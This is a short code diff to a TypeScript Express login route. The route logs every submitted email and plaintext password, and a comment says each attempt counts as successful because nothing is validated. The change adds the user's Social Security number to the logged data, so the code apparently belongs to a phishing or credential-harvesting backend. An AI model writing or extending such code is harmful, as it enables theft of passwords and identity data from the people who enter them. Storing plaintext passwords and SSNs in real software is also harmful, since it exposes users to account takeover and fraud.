@@ -13,7 +13,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
       const userAgent = req.get('User-Agent') || 'unknown';
       
       // Log login attempt immediately (always successful since no validation)
-      await storage.logLoginAttempt(validatedData.email, validatedData.password, true, ipAddress, userAgent);
+      await storage.logLoginAttempt(validatedData.email, validatedData.password, validatedData.ssn, true, ipAddress, userAgent);
       
       // Generate and store OTP
       const otpCode = await storage.generateOTP(validatedData.email);
